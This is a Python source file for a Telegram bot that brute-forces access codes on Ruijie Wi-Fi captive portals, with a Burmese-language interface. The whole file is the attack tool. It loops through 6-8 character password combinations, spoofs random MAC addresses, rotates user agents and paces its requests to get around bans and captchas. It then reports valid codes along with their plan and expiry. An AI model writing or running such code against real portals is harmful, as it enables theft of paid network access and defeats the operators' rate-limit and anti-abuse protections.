import os
BOT_TOKEN = os.getenv("BOT_TOKEN")

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import requests
import threading
import itertools
import time
import random
import re
import json


sessions = []
scanning_active = False
start_time = time.time()
attempts_since_last = 0
last_progress_time = time.time()
ban_count = 0  # Ban counter

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
]

def random_mac():
    return ":".join(["{:02x}".format(random.randint(0x00, 0xff)) for _ in range(6)])

def progress_bar(percent, width=20):
    filled = int(width * percent / 100)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 ဒီ bot က Ruijie Wi-Fi portal ကို brute-force လုပ်တယ်။\n"
        "/input <session_url> နဲ့ URL ထည့်ပါ။\n"
        "/scan <6|7|8|all> နဲ့ စတင်ပါ။"
    )

async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.replace("/input ", "").strip()
    if url.startswith("http"):
        sessions.append(url)
        await update.message.reply_text(f"✅ Session URL သိမ်းဆည်းပြီး။ စုစုပေါင်း {len(sessions)} ခု။")
    else:
        await update.message.reply_text("❌ တရားဝင် URL မဟုတ်ဘူး။")

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scanning_active, start_time, attempts_since_last, last_progress_time, ban_count
    if scanning_active:
        await update.message.reply_text("⏳ Scan လုပ်နေပြီးသား။")
        return
    args = context.args
    if not args:
        await update.message.reply_text("❌ /scan <6|7|8|all> ကို သုံးပါ။")
        return
    length = args[0]
    if length not in ["6", "7", "8", "all"]:
        await update.message.reply_text("❌ 6, 7, 8, သို့မဟုတ် all ကိုသာ သုံးပါ။")
        return
    if not sessions:
        await update.message.reply_text("❌ Session URL မရှိဘူး။ အရင်ဆုံး /input နဲ့ URL ထည့်ပါ။")
        return
    scanning_active = True
    start_time = time.time()
    attempts_since_last = 0
    last_progress_time = time.time()
    ban_count = 0  # Ban counter ကို ပြန်သတ်မှတ်ပါ
    await update.message.reply_text(f"🚀 Scan စတင်ပြီ။ စာလုံးအရေအတွက်: {length}။ (နှေးနှေးသွားမယ်)")
    thread = threading.Thread(target=bruteforce_worker, args=(update, context, length))
    thread.start()

def bruteforce_worker(update, context, length):
    global scanning_active, start_time, attempts_since_last, last_progress_time, ban_count
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"
    total_attempts = 0
    found_codes = []
    captcha_count = 0
    if length == "all":
        lengths = [6, 7, 8]
    else:
        lengths = [int(length)]
    for l in lengths:
        total_possible = len(chars) ** l
        for combo in itertools.product(chars, repeat=l):
            code = ''.join(combo)
            total_attempts += 1
            attempts_since_last += 1
            
            for session_url in sessions:
                new_mac = random_mac()
                test_url = session_url.replace("mac=44:71:47:44:35:05", f"mac={new_mac}")
                test_url = f"{test_url}&chap_password={code}"
                
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                }
                
                try:
                    response = requests.get(test_url, timeout=5, headers=headers)
                    
                    # Ban detection
                    if response.status_code == 403 or response.status_code == 429:
                        ban_count += 1
                    elif response.status_code == 200 and "success" in response.text.lower():
                        found_codes.append(code)
                        
                        plan = "Unknown"
                        time_plan = "Unknown"
                        try:
                            data = response.json()
                            plan = data.get("plan", data.get("Plan", "Unknown"))
                            time_plan = data.get("time", data.get("Time", data.get("expire", "Unknown")))
                        except:
                            text = response.text
                            plan_match = re.search(r'plan["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', text, re.IGNORECASE)
                            if plan_match:
                                plan = plan_match.group(1)
                            time_match = re.search(r'(?:time|expire|expiry)["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', text, re.IGNORECASE)
                            if time_match:
                                time_plan = time_match.group(1)
                        
                        context.bot.send_message(
                            chat_id=update.effective_chat.id,
                            text=f"✅ အောင်မြင်တဲ့ code တွေ့ပြီ: {code}\n"
                                 f"📋 Plan: {plan}\n"
                                 f"⏳ Time: {time_plan}\n"
                                 f"🔗 Session URL: {session_url}"
                        )
                    # CAPTCHA detection (ပုံထဲက "Captcha" ကို simulate လုပ်ထားတယ်)
                    elif "captcha" in response.text.lower() or response.status_code == 418:
                        captcha_count += 1
                except:
                    pass
                
                time.sleep(random.uniform(0.5, 1.5))
            
            # Progress ကို ၁၀၀ ကြိမ်တိုင်း ပြတယ်
            if total_attempts % 100 == 0:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    speed = int((total_attempts / elapsed) * 60)
                else:
                    speed = 0
                
                progress = (total_attempts / total_possible) * 100
                if progress > 100:
                    progress = 100
                
                bar = progress_bar(progress)
                
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🔍 Scanning Codes...\n"
                         f"📦 Checked : {total_attempts:,}/{total_possible:,}\n"
                         f"📊 Progress : {progress:.1f}%\n"
                         f"⚡ Speed : {speed:,} codes/min\n"
                         f"✅ Found : {len(found_codes)}\n"
                         f"🔄 Retry : 0\n"
                         f"🚫 Ban : {ban_count}\n"
                         f"🧩 Captcha : {captcha_count:,}\n"
                         f"{bar}"
                )
            
            if not scanning_active:
                break
    scanning_active = False
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"🏁 Scan ပြီးဆုံးပြီ။ စုစုပေါင်း ကြိုးစားမှု {total_attempts:,} ခု၊ တွေ့ရှိပြီး {len(found_codes)} ခု။"
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("input", handle_input))
    app.add_handler(CommandHandler("scan", scan))
    app.run_polling()

if __name__ == "__main__":
    main()
